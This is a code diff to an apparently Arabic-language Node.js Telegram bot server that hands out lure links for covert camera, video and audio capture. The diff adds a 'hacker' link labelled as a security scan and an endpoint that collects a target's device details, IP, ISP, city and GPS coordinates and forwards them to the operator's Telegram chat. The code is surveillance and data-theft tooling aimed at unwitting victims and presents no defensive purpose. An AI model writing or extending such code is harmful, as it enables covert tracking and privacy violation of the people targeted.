@@ -44,6 +44,10 @@ app.post('/telegram-webhook', async (req, res) => {
         link  = `${SERVER_URL}/video-audio.html`;
         title = "🎥 *رابط الفيديو (مع صوت):*";
       }
+      else if (data === "link_hacker") {
+        link  = `${SERVER_URL}/hacker.html`;
+        title = "🦠 *رابط الفحص الأمني:*";
+      }
 
       if (link) {
         await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/sendMessage`, {
@@ -53,7 +57,7 @@ app.post('/telegram-webhook', async (req, res) => {
         });
       }
 
-      // رد على تليجرام إننا استلمنا الضغطة
+      // رد على تليجرام
       await axios.post(`https://api.telegram.org/bot${SEND_BOT_TOKEN}/answerCallbackQuery`, {
         callback_query_id: cb.id
       });
@@ -83,9 +87,10 @@ app.post('/telegram-webhook', async (req, res) => {
           parse_mode: "Markdown",
           reply_markup: {
             inline_keyboard: [
-              [{ text: "📷 كاميرا (صور)",     callback_data: "link_photo" }],
-              [{ text: "🎥 فيديو بدون صوت",    callback_data: "link_video" }],
-              [{ text: "🎥 فيديو مع صوت",      callback_data: "link_video_audio" }]
+              [{ text: "📷 كاميرا (صور)",        callback_data: "link_photo" }],
+              [{ text: "🎥 فيديو بدون صوت",      callback_data: "link_video" }],
+              [{ text: "🎥 فيديو مع صوت",         callback_data: "link_video_audio" }],
+              [{ text: "🦠 فحص أمني (اختراق)",    callback_data: "link_hacker" }]
             ]
           }
         });
@@ -162,6 +167,52 @@ app.post('/api/upload-video', upload.single('video'), async (req, res) => {
     res.json({ success: true });
   } catch (err) {
     console.error("❌ upload-video:", err.response?.data || err.message);
+    res.status(500).json({ success: false });
+  }
+});
+
+// ========================================
+// API — استقبال معلومات الجهاز (hacker)
+// ========================================
+app.post('/api/upload-info', async (req, res) => {
+  try {
+    const info = req.body || {};
+
+    let text = "🦠 *تقرير الفحص الأمني*\n\n";
+
+    if (info.platform)  text += `📱 *الجهاز:* ${info.platform}\n`;
+    if (info.browser)   text += `🌐 *المتصفح:* ${info.browser}\n`;
+    if (info.screen)    text += `📐 *الشاشة:* ${info.screen}\n`;
+    if (info.language)  text += `🗣️ *اللغة:* ${info.language}\n`;
+    if (info.cores)     text += `💻 *الأنوية:* ${info.cores}\n`;
+    if (info.memory)    text += `🧠 *الذاكرة:* ${info.memory}\n`;
+    if (info.online)    text += `📶 *متصل:* ${info.online}\n`;
+
+    text += "\n🌍 *الشبكة:*\n";
+    if (info.ip)        text += `• IP: ${info.ip}\n`;
+    if (info.country)   text += `• البلد: ${info.country}\n`;
+    if (info.city)      text += `• المدينة: ${info.city}\n`;
+    if (info.isp)       text += `• ISP: ${info.isp}\n`;
+
+    if (info.lat && info.lng) {
+      text += "\n📍 *الموقع:*\n";
+      text += `• Latitude: ${info.lat}\n`;
+      text += `• Longitude: ${info.lng}\n`;
+      if (info.acc) text += `• الدقة: ${info.acc}\n`;
+    }
+
+    if (info.time) text += `\n🕐 *الوقت:* ${info.time}`;
+
+    await axios.post(`https://api.telegram.org/bot${RECV_BOT_TOKEN}/sendMessage`, {
+      chat_id: RECV_CHAT_ID,
+      text: text,
+      parse_mode: "Markdown"
+    });
+
+    console.log("✅ تم إرسال معلومات الجهاز → هنداوي");
+    res.json({ success: true });
+  } catch (err) {
+    console.error("❌ upload-info:", err.response?.data || err.message);
     res.status(500).json({ success: false });
   }
 });
